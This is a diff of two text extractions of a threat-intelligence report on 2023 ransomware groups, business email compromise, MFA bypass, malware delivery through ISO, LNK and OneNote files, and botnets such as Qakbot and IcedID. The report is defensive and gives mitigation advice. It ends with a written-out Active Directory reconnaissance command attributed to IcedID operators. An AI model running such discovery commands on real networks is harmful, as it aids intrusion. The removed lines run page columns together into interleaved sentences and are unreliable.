+actors, you can at least frustrate their activities and hamper their 
+ability to make and spend money, travel internationally, or leave 
+Russia at all.
+Romcom RAT Blurs the Lines
+The war in Ukraine has not permanently damaged the 
 cybercriminal landscape as originally hoped but third\-party 
 researchers and the media have asked questions25 about 
 whether it has blurred the lines between cybercrime and 
 nation\-state activity. GOLD FLAMINGO, operators of the 
 Cuba ransomware, has been accused of performing espionage 
-activities alongside moneymaking.The group was reported26 in August 2022 to have deployed 
+activities alongside moneymaking.
+The group was reported26 in August 2022 to have deployed 
 the RomCom RAT alongside Cuba ransomware in an intrusion. 
 CERT\-UA subsequently saw RomCom RAT used against 
-government and military targets in Ukraine27\.Figure 12\. GOLD FLAMINGO's Cuba ransomware leak site, which at the 
-time of publication had posted its most recent victim on July 11, 2023\. 
-(Source: Secureworks)The number of named Cuba ransomware victims dropped off 
+government and military targets in Ukraine27\.The number of named Cuba ransomware victims dropped off 
 throughout the year following the invasion of Ukraine. After a 
 brief surge in late 2022, no victims were named at all for the 
 first four months of 2023\. It is possible that the group has 
@@ -84,7 +1795,122 @@ has conducted those operations. It does not appear that Cuba
 ransomware itself has been deployed against these Ukrainian 
 targets, and there is still no smoking gun evidence about 
 routine collusion between ransomware groups and Russian 
-intelligence operations.2023 State of the Threat: A Year in Review3001Letter From Our VPChinese Cybercrime Activity0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur04When Infection Chains AreA very high proportion of the ransomware activity that CTUresearchers observe emanates from cybercriminals based in eitherRussia or its CIS neighbors. However, there are exceptions. Overthe past year, we have observed cybercriminal attacks conductedby financially motivated threat groups that are likely Chinese. Onegroup is particularly noteworthy: GOLD FIESTA.CTU analysis of GOLD FIESTA intrusion activity, which wasobserved during several incident response engagements that tookplace in February 2023, identified clear overlap with Hello, Cring,and Rapture ransomware precursor activity. For example, we sawForced to Evolvethe use of a rare set\-alias command for the PowerShell Invoke\-Expression cmdlet that is associated with Chinese\-languageresearch on antivirus evasion that was also observed in RaptureAnother possible example of a financially motivated Chinese groupis GOLD BARONDALE. The group leveraged a DNS logging platformin a November 2022 attack we observed that has previously beenassociated with Chinese state\-sponsored groups. This attack wasfrustrated before the attackers achieved their goals on the network,so we cannot say for sure whether it was financially motivated, butthe targeting was not typical of cyberespionage activity.Both groups commonly use open\-source tools and techniquesprimarily associated with Chinese\-language security research, incommon with many Chinese state\-sponsored espionage groupssuch as BRONZE UNIVERSITY and BRONZE ATLAS. It would beunsurprising for groups to prefer tools and techniques covered inopen\-source research written in their native language. It is evenpossible that there is some overlap in personnel between groups,as with the charges29 levied in the U.S. in 2020 against BRONZE0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08Appendixactivity in 2023, and Hello and Cring activity in 2021\. It appearsATLAS members.probable that GOLD FIESTA developed and deployed these andlikely other ransomware families.GOLD FIESTA likely used scan\-and\-exploit against SharePointserver vulnerabilities to gain access in the February 2023 intrusions,as it has done in previous attacks. Third\-party observations28 ofHello precursor activity identified the IAV as the exploitation of theSharePoint vulnerability CVE\-2019\-0604\.2023 State of the Threat: A Year in Review31in May 2022, having responded to multiple incidents involvingCOBALT MIRAGE activity. Despite this and other public reports onthis group, attacks continued, likely driven both by their freedom tooperate this criminal enterprise and the intent to make money forthemselves. While sufficiently competent to quickly fold publiclydisclosed vulnerabilities and proof of concept code into theiroperations, they were not adept at covering their tracks.On September 14, 2022, Secureworks published30 a detailed reportproviding credible technical evidence (see figure 13\) linking theCOBALT MIRAGE activity to several individuals: Ahmad Khatibi,CEO of Afkar System Co. and Mansour Ahmadi, CEO of NajeeTechnology, as well as a third entity known as Secnerd, also linkedto Mansour Ahmadi.01Letter From Our VPIranian Ransomware for Revenue0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08AppendixRansomware is routinely used by Iranian state\-sponsored threatgroups as a disruptive tool in targeted attacks, often againstregional adversaries, particularly Israel. However, one Iranian grouphas stood out in their use of ransomware style attacks resultingfrom a financial, rather than political, motive.COBALT MIRAGE has been operating since at least June 2020,conducting opportunistic intrusions using scan\-and\-exploittactics and following up with ransomware attacks using MicrosoftBitlocker and the open source DiskCryptor encryption solution.CTU researchers initially publicly reported on this group's activityFile Name
+intelligence operations.
+Figure 12\. GOLD FLAMINGO's Cuba ransomware leak site, which at the 
+time of publication had posted its most recent victim on July 11, 2023\. 
+(Source: Secureworks)
+31
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+Chinese Cybercrime Activity 
+A very high proportion of the ransomware activity that CTU 
+researchers observe emanates from cybercriminals based in either 
+Russia or its CIS neighbors. However, there are exceptions. Over 
+the past year, we have observed cybercriminal attacks conducted 
+by financially motivated threat groups that are likely Chinese. One 
+group is particularly noteworthy: GOLD FIESTA.
+CTU analysis of GOLD FIESTA intrusion activity, which was 
+observed during several incident response engagements that took 
+place in February 2023, identified clear overlap with Hello, Cring, 
+and Rapture ransomware precursor activity. For example, we saw 
+the use of a rare set\-alias command for the PowerShell Invoke\-
+Expression cmdlet that is associated with Chinese\-language 
+research on antivirus evasion that was also observed in Rapture 
+activity in 2023, and Hello and Cring activity in 2021\. It appears 
+probable that GOLD FIESTA developed and deployed these and 
+likely other ransomware families. 
+GOLD FIESTA likely used scan\-and\-exploit against SharePoint 
+server vulnerabilities to gain access in the February 2023 intrusions, 
+as it has done in previous attacks. Third\-party observations28 of 
+Hello precursor activity identified the IAV as the exploitation of the 
+SharePoint vulnerability CVE\-2019\-0604\.
+Another possible example of a financially motivated Chinese group 
+is GOLD BARONDALE. The group leveraged a DNS logging platform 
+in a November 2022 attack we observed that has previously been 
+associated with Chinese state\-sponsored groups. This attack was 
+frustrated before the attackers achieved their goals on the network, 
+so we cannot say for sure whether it was financially motivated, but 
+the targeting was not typical of cyberespionage activity. 
+Both groups commonly use open\-source tools and techniques 
+primarily associated with Chinese\-language security research, in 
+common with many Chinese state\-sponsored espionage groups 
+such as BRONZE UNIVERSITY and BRONZE ATLAS. It would be 
+unsurprising for groups to prefer tools and techniques covered in 
+open\-source research written in their native language. It is even 
+possible that there is some overlap in personnel between groups, 
+as with the charges29 levied in the U.S. in 2020 against BRONZE 
+ATLAS members.
+32
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+Iranian Ransomware for Revenue 
+Ransomware is routinely used by Iranian state\-sponsored threat 
+groups as a disruptive tool in targeted attacks, often against 
+regional adversaries, particularly Israel. However, one Iranian group 
+has stood out in their use of ransomware style attacks resulting 
+from a financial, rather than political, motive. 
+COBALT MIRAGE has been operating since at least June 2020, 
+conducting opportunistic intrusions using scan\-and\-exploit 
+tactics and following up with ransomware attacks using Microsoft 
+Bitlocker and the open source DiskCryptor encryption solution. 
+CTU researchers initially publicly reported on this group's activity 
+in May 2022, having responded to multiple incidents involving 
+COBALT MIRAGE activity. Despite this and other public reports on 
+this group, attacks continued, likely driven both by their freedom to 
+operate this criminal enterprise and the intent to make money for 
+themselves. While sufficiently competent to quickly fold publicly 
+disclosed vulnerabilities and proof of concept code into their 
+operations, they were not adept at covering their tracks. 
+On September 14, 2022, Secureworks published30 a detailed report 
+providing credible technical evidence (see figure 13\) linking the 
+COBALT MIRAGE activity to several individuals: Ahmad Khatibi, 
+CEO of Afkar System Co. and Mansour Ahmadi, CEO of Najee 
+Technology, as well as a third entity known as Secnerd, also linked 
+to Mansour Ahmadi. 
+Figure 13\. Document metadata revealed the identity of an individual linked to COBALT MIRAGE ransomware activity (Source: Secureworks)
+File Name
 Directory
 File Size
 File Modification DateTime
@@ -106,32 +1932,12 @@ Create Date
 Modify Date
 Document ID
 Instance ID
-Author:
-:
-:
-: 
-: 
-: 
-: 
-: 
-: 
-: 
-: 
-: 
-: 
-: 
-: 
-: 
-: 
-: 
-: 
-: 
-: 
-: 
-:Hi.pdf
+Author
+Hi.pdf
 .
 39 kB
-2021:12:17 08:55:00\+00:00rwxr\-xr\-x
+2021:12:17 08:55:00\+00:00
+rwxr\-xr\-x
 PDF
 pdf
 applicationpdf
@@ -147,16 +1953,457 @@ Microsoft Word 2019
 2021:12:17 23:54:22\+03:30
 uuid:
 uuid:
-ahmad khatibiFigure 13\. Document metadata revealed the identity of an individual linked to COBALT MIRAGE ransomware activity (Source: Secureworks)2023 State of the Threat: A Year in Review3201Letter From Our VP0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08AppendixLater that day the U.S. Department of Justice issued31 anSince the September publications, COBALT MIRAGE ransomwareindictment for both Ahmad Khatibi and Mansour Ahmadi, and aactivity appears to have ceased. However, it is likely that thethird individual, Amir Hossein, in relation to attacks on hundreds ofindividuals involved continue to work on other projects.victims in the U.S. including a children's hospital.The U.S. Department of the Treasury sanctioned32 the same threeindividuals and seven others, and a joint cybersecurity advisory waspublished based on work from multiple Five Eyes agencies. Thepublication referred to these individuals as Islamic RevolutionaryGuard Corp (IRGC) affiliated actors. It is unclear to what degreethe ransomware activity was IRGC\-directed or whether it was aside\-activity alongside work that was performed for the IRGC. Apotential operational model is illustrated below.Islamic Revolutionary Guard Corps Intelligence
-Organization (IRGC\-IO)TasksNajee Technology \& SecnerdSupport COBALT 
-MIRAGE OperationsAfkar SystemFigure 14\. Potential relationships between Najee, Secnerd, Afkar System, and the IRGC\-IO. (Source: Secureworks)2023 State of the Threat: A Year in Review33Business Email Compromise 
-a Persistent ProblemBusiness email compromise (BEC) is one of the most financiallydamaging online crimes overall for organizations. It exceeds evenransomware in aggregate, mainly because it is so prolific, even ifindividual financial losses from BEC may be lower than individuallosses from ransomware. The FBI estimates33 that in 2022 alone, itreceived complaints about 21,832 BEC attacks, resulting in adjustedlosses in the U.S. of over $2\.7 billion USD, an increase from $2\.4billion USD in 2021\. In contrast, the FBI received 2,385 complaintsabout ransomware attacks in the U.S. in 2022 that resulted inestimates for adjusted losses of approximately $34\.3 million.However, individuals and organizations may be more motivatedto report BEC than ransomware attacks to the FBI which couldsomewhat skew these figures.Most BEC incidents involve a threat actor intercepting an email chainand impersonating one of the participants to convince the victim tomodify details of a legitimate payment to redirect it to an attacker\-controlled bank account rather than the intended recipient.Threat actors use a range of techniques including mass phishingcampaigns to steal credentials which are then used to access thevictim email account. Once they have access, they often monitorthe activity of the email account, identifying email chains withvendors and suppliers in which they can insert themselves. After theattacker has successfully initiated communication with the victim,they provide modified legitimate financial documents or paymentinstructions for the victim to send money to the attacker\-controlledaccounts. Attackers may also spoof victim organizations to requestpayment without first compromising a victim's email account. Thisvariation is referred to as Business Email Spoofing or CEO fraud.Over the course of the year, CTU researchers have observed threatactors employing a range of different methods to capture credentialsand facilitate BEC fraud. These have included the use of offlineHTML login pages to circumvent detections that look for maliciousexecutables or documents that auto\-forward users to fake loginpages. Threat actors have also been observed employing a varietyof tactics to bypass multi\-factor authentication (MFA) includingsocial engineering to convince a victim to approve an authenticationrequest and, less frequently, MFA fatigue attacks which send manyauthorization requests in quick succession. Once a victim approves amalicious MFA request, the threat actor can add their own device toa list of approved devices to maintain persistence.01Letter From Our VP0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08Appendix2023 State of the Threat: A Year in Review34In one compromise analyzed by Secureworks incident responders,Organizations can mitigate BEC attacks by comprehensivelya threat actor gained access because an employee approvedimplementing MFA across all user accounts, including those fora malicious MFA request and did not report the incident. Oncesenior executives. But remember that not all MFA solutions areauthenticated, the threat actor added their device to a list ofcreated equal; using an authenticator app is better than SMS,approved MFA devices. The threat actor leveraged this access toand number matching is an improvement on click\-to\-accept, andmonitor the victim's emails for an extended period without detection.represents a meaningful mitigation to MFA fatigue. It is advisableThey then launched a successful attack to reroute a scheduledto closely follow Microsoft's Outlook authentication guidance topayment. In other incidents, threat actors were able to circumventcontinually adopt best practices. Training employees not to acceptMFA completely. In one such case, thanks to non\-configuredMFA requests they did not generate is also a useful exercise. RobustConditional Access policies, the threat actor was able to gainbusiness processes such as two\-person payment processing,access without involving MFA. In another, the presence of legacytelephone\-only approvals, and telephone\-only vendor checks areauthentication methods on the system allowed the threat actor toessential.bypass MFA and still gain access.01Letter From Our VP0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08Appendix2023 State of the Threat: A Year in Review3504Innovations in TTPs Occur 
+ahmad khatibi
+:
+:
+:
+: 
+: 
+: 
+: 
+: 
+: 
+: 
+: 
+: 
+: 
+: 
+: 
+: 
+: 
+: 
+: 
+: 
+: 
+: 
+:
+33
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+Later that day the U.S. Department of Justice issued31 an 
+indictment for both Ahmad Khatibi and Mansour Ahmadi, and a 
+third individual, Amir Hossein, in relation to attacks on hundreds of 
+victims in the U.S. including a children's hospital. 
+The U.S. Department of the Treasury sanctioned32 the same three 
+individuals and seven others, and a joint cybersecurity advisory was 
+published based on work from multiple Five Eyes agencies. The 
+publication referred to these individuals as Islamic Revolutionary 
+Guard Corp (IRGC) affiliated actors. It is unclear to what degree 
+the ransomware activity was IRGC\-directed or whether it was a 
+side\-activity alongside work that was performed for the IRGC. A 
+potential operational model is illustrated below.
+Since the September publications, COBALT MIRAGE ransomware 
+activity appears to have ceased. However, it is likely that the 
+individuals involved continue to work on other projects.
+Figure 14\. Potential relationships between Najee, Secnerd, Afkar System, and the IRGC\-IO. (Source: Secureworks)
+Islamic Revolutionary Guard Corps Intelligence
+Organization (IRGC\-IO)
+Support COBALT 
+MIRAGE Operations
+Tasks
+Najee Technology \& Secnerd
+Afkar System
+34
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+Business Email Compromise 
+a Persistent Problem
+Business email compromise (BEC) is one of the most financially 
+damaging online crimes overall for organizations. It exceeds even 
+ransomware in aggregate, mainly because it is so prolific, even if 
+individual financial losses from BEC may be lower than individual 
+losses from ransomware. The FBI estimates33 that in 2022 alone, it 
+received complaints about 21,832 BEC attacks, resulting in adjusted 
+losses in the U.S. of over $2\.7 billion USD, an increase from $2\.4 
+billion USD in 2021\. In contrast, the FBI received 2,385 complaints 
+about ransomware attacks in the U.S. in 2022 that resulted in 
+estimates for adjusted losses of approximately $34\.3 million. 
+However, individuals and organizations may be more motivated 
+to report BEC than ransomware attacks to the FBI which could 
+somewhat skew these figures.
+Most BEC incidents involve a threat actor intercepting an email chain 
+and impersonating one of the participants to convince the victim to 
+modify details of a legitimate payment to redirect it to an attacker\-
+controlled bank account rather than the intended recipient. 
+Threat actors use a range of techniques including mass phishing 
+campaigns to steal credentials which are then used to access the 
+victim email account. Once they have access, they often monitor 
+the activity of the email account, identifying email chains with 
+vendors and suppliers in which they can insert themselves. After the 
+attacker has successfully initiated communication with the victim, 
+they provide modified legitimate financial documents or payment 
+instructions for the victim to send money to the attacker\-controlled 
+accounts. Attackers may also spoof victim organizations to request 
+payment without first compromising a victim's email account. This 
+variation is referred to as Business Email Spoofing or CEO fraud.
+Over the course of the year, CTU researchers have observed threat 
+actors employing a range of different methods to capture credentials 
+and facilitate BEC fraud. These have included the use of offline 
+HTML login pages to circumvent detections that look for malicious 
+executables or documents that auto\-forward users to fake login 
+pages. Threat actors have also been observed employing a variety 
+of tactics to bypass multi\-factor authentication (MFA) including 
+social engineering to convince a victim to approve an authentication 
+request and, less frequently, MFA fatigue attacks which send many 
+authorization requests in quick succession. Once a victim approves a 
+malicious MFA request, the threat actor can add their own device to 
+a list of approved devices to maintain persistence.
+35
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+In one compromise analyzed by Secureworks incident responders, 
+a threat actor gained access because an employee approved 
+a malicious MFA request and did not report the incident. Once 
+authenticated, the threat actor added their device to a list of 
+approved MFA devices. The threat actor leveraged this access to 
+monitor the victim's emails for an extended period without detection. 
+They then launched a successful attack to reroute a scheduled 
+payment. In other incidents, threat actors were able to circumvent 
+MFA completely. In one such case, thanks to non\-configured 
+Conditional Access policies, the threat actor was able to gain 
+access without involving MFA. In another, the presence of legacy 
+authentication methods on the system allowed the threat actor to 
+bypass MFA and still gain access.
+Organizations can mitigate BEC attacks by comprehensively 
+implementing MFA across all user accounts, including those for 
+senior executives. But remember that not all MFA solutions are 
+created equal; using an authenticator app is better than SMS, 
+and number matching is an improvement on click\-to\-accept, and 
+represents a meaningful mitigation to MFA fatigue. It is advisable 
+to closely follow Microsoft's Outlook authentication guidance to 
+continually adopt best practices. Training employees not to accept 
+MFA requests they did not generate is also a useful exercise. Robust 
+business processes such as two\-person payment processing, 
+telephone\-only approvals, and telephone\-only vendor checks are 
+essential.
+36
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+04
+Innovations in TTPs Occur 
 When Infection Chains 
-Are Forced to Evolve01Letter From Our VP0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08Appendix2023 State of the Threat: A Year in Review3601Letter From Our VPWhen Microsoft Disabled Macroscontainers is the Windows Shortcut, or LNK files, which can executeadditional files within the container using command line parameters,Macro\-enabled Office documents have been a mainstay of malwareas necessary.0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?distribution campaigns for many years. That started to slow downwhen Microsoft announced34 substantive action against this threatin early 2022\. Microsoft revealed they would begin blocking macrosfrom executing by default in documents downloaded from theInternet, as indicated by the mark\-of\-the\-web (MotW) metadataadded by Windows to downloaded files. After a false start in earlyJune 2022, the change was made permanent in Office products inlate July, reducing the impact of this malware delivery mechanism inInnovations in TTPs Occur04When Infection Chains Areone fell swoop.Forced to EvolveThe change forced threat actors to adopt alternative infection chainsFor example, the DarkTortilla crypter35 is typically delivered by emailswith a logistics lure and includes the malicious payload in an archiveattachment with file types such as .iso, .zip, .img, .dmg, and .tar.In one campaign that CTU researchers investigated, the redactedfilename of the attached ISO image archive file (.iso) included thename of the organization from which the email was purportedly sent.to keep phishing success rates up. CTU researchers have observedan increase in the number of spam campaigns relying on containerpayloadssuch as ISO, IMG, and VHDXto deliver malware. Thesefile types are opened natively by modern Windows versions and arepresented to users as a folder opened within the familiar Explorerinterface, where they can navigate to the malicious files foundwithin. The most common type of malicious file located in these0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08AppendixISOLNKZIPDLLFigure 15\. Common file extensions used in attacks. (Source: Secureworks)2023 State of the Threat: A Year in Review3701Letter From Our VP0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08AppendixFigure 16\. DarkTortilla malspam containing malicious archive attachment. 
+Are Forced to Evolve
+37
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+When Microsoft Disabled Macros
+Macro\-enabled Office documents have been a mainstay of malware 
+distribution campaigns for many years. That started to slow down 
+when Microsoft announced34 substantive action against this threat 
+in early 2022\. Microsoft revealed they would begin blocking macros 
+from executing by default in documents downloaded from the 
+Internet, as indicated by the mark\-of\-the\-web (MotW) metadata 
+added by Windows to downloaded files. After a false start in early 
+June 2022, the change was made permanent in Office products in 
+late July, reducing the impact of this malware delivery mechanism in 
+one fell swoop.
+The change forced threat actors to adopt alternative infection chains 
+to keep phishing success rates up. CTU researchers have observed 
+an increase in the number of spam campaigns relying on container 
+payloadssuch as ISO, IMG, and VHDXto deliver malware. These 
+file types are opened natively by modern Windows versions and are 
+presented to users as a folder opened within the familiar Explorer 
+interface, where they can navigate to the malicious files found 
+within. The most common type of malicious file located in these 
+containers is the Windows Shortcut, or LNK files, which can execute 
+additional files within the container using command line parameters, 
+as necessary.
+For example, the DarkTortilla crypter35 is typically delivered by emails 
+with a logistics lure and includes the malicious payload in an archive 
+attachment with file types such as .iso, .zip, .img, .dmg, and .tar. 
+In one campaign that CTU researchers investigated, the redacted 
+filename of the attached ISO image archive file (.iso) included the 
+name of the organization from which the email was purportedly sent.
+Figure 15\. Common file extensions used in attacks. (Source: Secureworks)
+LNK
+ISO
+ZIP
+DLL
+38
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+Many techniques have remained the same, including the use of 
+ZIP archives to encapsulate delivered files. Less common formats 
+such as RAR and ACE are seen on occasion but suffer from 
+Windows' inability to open these files without third\-party utilities 
+installed. Similarly, active content such as executable, script files, 
+and shortcut links remain popular. JavaScript, VBS, and Windows 
+batch files are the most commonly observed script types observed 
+in attacks. In one phishing campaign to deliver the Remcos RAT 
+that CTU researchers observed in May 2023, emails included ZIP 
+archive attachments that contained PDF files. Clicking on the PDF 
+took victims first to a gateway page that performed checks on the 
+victim's system and then to a prompt to download an obfuscated 
+VBS file from the MEGA cloud file\-sharing site.
+Threat actors have also increasingly turned to the use of malicious 
+Microsoft OneNote files to deliver payloads such as the RedLine 
+information stealer, Qakbot, or IcedID. CTU researchers observed 
+two infection chains used by unknown threat actors from January 
+12 to January 18, 2023, to deliver RedLine. In both cases, the 
+victim received a OneNote file attachment. Opening it revealed 
+a blurred image which recipients were invited to click. This image 
+was underlaid with multiple copies of a malicious script. Executing 
+the script generated a pop\-up warning. If the victim dismissed the 
+warning, the script launched a BAT file, copied a PowerShell binary to 
+a new location, and executed a PowerShell command that decrypted, 
+decompressed, and executed the RedLine payload. 
+Threat actors evolved their use of OneNote files over the following 
+months to avoid detection. In a campaign that delivered Qakbot, the 
+OneNote attachment contained an embedded HTML Application 
+(HTA) file (Open.hta) that downloaded and executed the Qakbot 
+payload. In further campaigns to deliver IcedID, a threat actor used 
+a similar approach to the Qakbot campaign, leveraging modified 
+HTA code to launch obfuscated VBScript code that launched a 
+PowerShell command to download and execute the payload. CTU 
+researchers have investigated several intrusions that ultimately led to 
+Black Basta ransomware deployment where OneNote files were used 
+to deliver Qakbot.
+Figure 16\. DarkTortilla malspam containing malicious archive attachment. 
 (The German text translates to Good morning, Please give us your best 
 price offer for our attached order. Awaiting your kind reply. Kind regards.)
-(Source: Secureworks)Many techniques have remained the same, including the use ofZIP archives to encapsulate delivered files. Less common formatssuch as RAR and ACE are seen on occasion but suffer fromWindows' inability to open these files without third\-party utilitiesinstalled. Similarly, active content such as executable, script files,and shortcut links remain popular. JavaScript, VBS, and Windowsbatch files are the most commonly observed script types observedin attacks. In one phishing campaign to deliver the Remcos RATthat CTU researchers observed in May 2023, emails included ZIParchive attachments that contained PDF files. Clicking on the PDFtook victims first to a gateway page that performed checks on thevictim's system and then to a prompt to download an obfuscatedVBS file from the MEGA cloud file\-sharing site.Threat actors have also increasingly turned to the use of maliciousMicrosoft OneNote files to deliver payloads such as the RedLineinformation stealer, Qakbot, or IcedID. CTU researchers observedtwo infection chains used by unknown threat actors from January12 to January 18, 2023, to deliver RedLine. In both cases, thevictim received a OneNote file attachment. Opening it revealeda blurred image which recipients were invited to click. This imagewas underlaid with multiple copies of a malicious script. Executingthe script generated a pop\-up warning. If the victim dismissed thewarning, the script launched a BAT file, copied a PowerShell binary toa new location, and executed a PowerShell command that decrypted,decompressed, and executed the RedLine payload.Threat actors evolved their use of OneNote files over the followingmonths to avoid detection. In a campaign that delivered Qakbot, theOneNote attachment contained an embedded HTML Application(HTA) file (Open.hta) that downloaded and executed the Qakbotpayload. In further campaigns to deliver IcedID, a threat actor useda similar approach to the Qakbot campaign, leveraging modifiedHTA code to launch obfuscated VBScript code that launched aPowerShell command to download and execute the payload. CTUresearchers have investigated several intrusions that ultimately led toBlack Basta ransomware deployment where OneNote files were usedto deliver Qakbot.2023 State of the Threat: A Year in Review3801Letter From Our VP0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07ConclusionBotnetsSome Flourish,
-Others DeclineThe past year saw the continued decline of the large\-scale, long\-lived botnets favored by cybercriminals for the past decade and ahalf. The Conti leaks fallout of March 2022 expedited the downfall ofboth the TrickBot and Bazar botnets, previously operated by GOLDBLACKBURN. The last year also saw GOLD CRESTWOOD's prolificEmotet botnet, whose association with the Conti ransomwareoperation was revealed in the Conti leaks, largely sidelined by itsoperators for unknown reasons, despite several signals that theyintended to return it to its former prevalence. For example, inOctober GOLD CRESTWOOD implemented functionality in theirEmotet malware that was likely intended to identify researchersystems and malware sandboxes. However, on November 11, it tooka four\-month hiatus, only returning for a brief burst of spamming inMarch that lasted until early April.At the end of August 2023, we also saw the demise of GOLDLAGOONs Qakbot. Thanks to the concerted international lawenforcement Operation Duck Hunt36, led by the FBI, the botnetwas rendered inoperable. At 23:27 UTC on August 25, we observedthe successful takedown through our botnet emulator, detectingthe Qakbot botnet distributing shellcode to infected devices. Theshellcode unpacked a custom DLL (dynamic link library) executablecontaining code that cleanly terminates the running Qakbot processAt approximately the same time as the DLL began neutralizinginfections, CTU researchers observed GOLD LAGOON's backendinfrastructure had stopped responding and some infrastructure hadbeen replaced. To interact with infected hosts, the replacementservers required a certificate that can sign messages. Such effortswill make it very hard for GOLD LAGOON to reimplement Qakbot.Qakbot posed a significant threat to businesses globally. Engineeredfor eCrime, Qakbot infections led to the deployment of some ofthe most sophisticated and damaging ransomware variants. Theseincluded Conti, ProLock, Egregor, REvil, MegaCortex, and, morerecently, Black Basta, and collectively resulted in losses to businessesin the hundreds of millions of U.S. dollars. The takedown is awelcome intervention.By contrast, the IcedID botnet flourished in the past year, having longdispensed with its original purpose of facilitating banking fraud toinstead provide initial access to a variety of ransomware\-distributingthreat groups. IcedID is used to deliver additional malware which canlead to ransomware deployment; its operator, GOLD SWATHMORE,functions as an initial access broker (IAB), selling access tocompromised systems to numerous ransomware operators. In oneIcedID infection, which CTU researchers executed in a sandboxedenvironment simulating a corporate network, the threat actordeployed Cobalt Strike Beacon 21 hours after the initial compromise.IcedID took an unusual hiatus between May 12 and June 7 but hasbeen active during most of the rest of the reporting period.08Appendixon infected hosts. The takedown was conducted in such a way thatQakbot will not run if the host is restarted.2023 State of the Threat: A Year in Review390203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08Appendix01Letter From Our VPIcedID CommunicationsIcedID is distributed as a loader executable that transmits basicsystem profile information to a first\-stage loader C2 server. Thisloader C2 server delivers the encrypted core IcedID module tocompromised hosts that meet infection criteria as determinedby the IcedID backend. The downloaded core IcedID module isdecrypted, saved to disk, loaded into memory, and executed. Themalware cycles through several hard\-coded C2 servers until itestablishes a connection. It then requests available updates, newC2 servers, and additional commands for execution. IcedID istypically instructed to execute several system and network profilingcommands shortly after infection. The output of these commandsis transmitted to a C2 server. GOLD SWATHMORE and its affiliatesuse the data to identify high\-value hosts that receive additionalcommands or malware payloads.\> net group Domain Admins domain
